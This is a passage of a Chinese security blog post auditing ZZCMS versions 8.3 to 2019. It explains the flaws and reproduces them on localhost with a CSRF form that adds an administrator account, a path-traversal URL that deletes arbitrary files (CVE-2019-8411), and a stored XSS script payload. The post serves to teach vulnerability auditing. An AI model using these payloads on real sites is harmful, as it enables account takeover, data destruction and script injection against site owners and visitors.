+<p><strong>漏洞复现:</strong><br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;html&gt;</span></span><br><span class="line">  <span class="symbol">&lt;body&gt;</span></span><br><span class="line">  <span class="symbol">&lt;script&gt;</span><span class="keyword">history</span>.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)&lt;/script&gt;</span><br><span class="line">    &lt;form action=<span class="string">"http://127.0.0.1/test/adminadd.php?action=add"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"groupid"</span> value=<span class="string">"1"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"admins"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"passs"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"passs2"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"Submit request"</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html</span><br></pre></td></tr></table></figure></p>
+<p>如果管理员点击,就会添加管理员用户</p>
+<h1 id="ZZCMS-2018"><a href="#ZZCMS-2018" class="headerlink" title="ZZCMS 2018"></a>ZZCMS 2018</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g10aywgajbj30hv04qq30.jpg" alt=""></p>
+<h2 id="任意文件删除漏洞"><a href="#任意文件删除漏洞" class="headerlink" title="任意文件删除漏洞"></a>任意文件删除漏洞</h2><p>CVE-2019-8411<br> <strong>漏洞文件</strong> /admin/dl_data.php<br> <strong>漏洞分析</strong><br> 看到这个这个漏洞,我再回过头看8.2和8.3 版本 的源代码 发现原来是早就在8.2存在的漏洞</p>
+<p> <img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0z6cbmz8gj30lx059dg2.jpg" alt=""></p>
+<p> 直接从get获取filename的值 拼接到$fp 也没有用单引号包裹 然后直接进行文件删除</p>
+<p> <strong>漏洞复现:</strong></p>
+<p> 首先在wwww目录下新建test目录,在test目录下建一个yang.txt文件，然后在浏览器输入</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/admin/</span>dl_data.php?action=del&amp;filename=..<span class="regexp">/test/y</span>ang.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g10ax6sndqj30z60a0q43.jpg" alt=""><br>发现,yang.txt已经被删除了</p>
+<h1 id="zzcms-2019"><a href="#zzcms-2019" class="headerlink" title="zzcms 2019"></a>zzcms 2019</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0z4uz95rej30ws06i3zc.jpg" alt=""><br>在对2019版本随便测试了一下<br>发现2019版本还是有一部分在8.2存在的XSS漏洞漏洞还没修复</p>
+<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>这个存储型xss注入漏洞 是在前不久爆出来的 比cms官网写的最新更新时间晚  说明这个漏洞还没修复,可是当我去官网下载这个cms进行复现时复现不了 发现已经被悄悄修复了 哼~  所以只能讲下原理</p>
+<p><strong>漏洞文件</strong> /user/ask.php // 这是个发问答的功能文件<br><strong>漏洞分析</strong><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$do=<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>])?$_GET[<span class="string">'do'</span>]:<span class="string">''</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">switch</span> ($do) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> <span class="string">"add"</span>:add();<span class="keyword">break</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> <span class="string">"modify"</span>:modify();<span class="keyword">break</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p>
+<p>找到modify()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1662802twj30ps0b9myk.jpg" alt=""><br>再跟进markit() 在 /inc/function.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1664mp70aj30zp03n74n.jpg" alt=""></p>
+<p>可以看到,这个url 没有进行 过滤 直接插入到了 语句中<br>接下来在url中构造xss代码<br>url/to/zzmcs/user/ask.php?do=modify&amp;page=1&amp;id=1&amp;aaa=<script>alert(/xss/)</script><br>当管理员访问后台查看不良数据时会触发XSS漏洞</p>
+<h1 id="代码审计经验"><a href="#代码审计经验" class="headerlink" title="代码审计经验"></a>代码审计经验</h1><p>在分析cms 或者是很长的代码时 用seay 等审计系统进行追踪调试 更方便清晰<br>对用户可控的数据 利用审计系统进行追踪 看看进行了哪些包装过滤,并分析这些函数是否有漏洞可绕过<br>关注 功能代码，配置文件，比如看看过滤sql注入功能的代码 数据库连接时是否出现漏洞<br>分析各类漏洞可能使用的危险函数,寻找这些能够产生漏洞的函数进行分析 比如unlink(),fread(),eval(),preg_replace(),query()等等<br>查看是否存在逻辑漏洞，比如 程序是否可以重复安装 ，修改密码是否存在越权修改其他用户密码，找回密码验证码是否可以暴力破解, 验证存在绕过<br>要学会经常复现 复现会遇到问题 你的问题有可能与别人的不一样 你测试成功payload语句和poc也有可能与别人不一样<br>在进行对某个cms进行审计时 可以去看看这个cms官网的历史更新版本即历史漏洞,</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div></div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="筱阳 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="筱阳 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/16/php-bugs-php代码审计基础/" rel="next" title="php_bugs(php代码审计基础)">
+                <i class="fa fa-chevron-left"></i> php_bugs(php代码审计基础)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="筱阳">
+            
+              <p class="site-author-name" itemprop="name">筱阳</p>
+              <p class="site-description motion-element" itemprop="description">只会复现的菜鸡</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.freebuf.com/" title="freebug" target="_blank">freebug</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ZZCMS基础"><span class="nav-number">1.</span> <span class="nav-text">ZZCMS基础</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#zzcms-8-2"><span class="nav-number">2.</span> <span class="nav-text">zzcms 8.2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-number">2.1.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#任意文件删除"><span class="nav-number">2.2.</span> <span class="nav-text">任意文件删除</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql注入"><span class="nav-number">2.3.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#任意用户密码修改"><span class="nav-number">2.4.</span> <span class="nav-text">任意用户密码修改</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ZZCMS-8-3"><span class="nav-number">3.</span> <span class="nav-text">ZZCMS 8.3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF"><span class="nav-number">3.1.</span> <span class="nav-text">CSRF</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ZZCMS-2018"><span class="nav-number">4.</span> <span class="nav-text">ZZCMS 2018</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#任意文件删除漏洞"><span class="nav-number">4.1.</span> <span class="nav-text">任意文件删除漏洞</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#zzcms-2019"><span class="nav-number">5.</span> <span class="nav-text">zzcms 2019</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#xss"><span class="nav-number">5.1.</span> <span class="nav-text">xss</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#代码审计经验"><span class="nav-number">6.</span> <span class="nav-text">代码审计经验</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">筱阳</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
